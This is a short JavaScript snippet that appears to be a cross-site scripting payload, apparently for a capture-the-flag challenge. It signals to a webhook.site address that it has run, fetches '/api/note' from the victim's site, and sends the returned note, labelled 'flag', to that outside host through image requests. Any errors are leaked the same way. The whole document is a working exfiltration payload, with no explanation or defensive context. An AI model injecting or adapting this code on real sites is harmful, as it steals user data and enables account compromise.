new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?executed=true";

fetch("/api/note")
  .then(r => r.json())
  .then(data => {
    new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?flag=" + encodeURIComponent(data.note);
  })
  .catch(err => {
    new Image().src = "https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588?error=" + encodeURIComponent(err.message);
  });
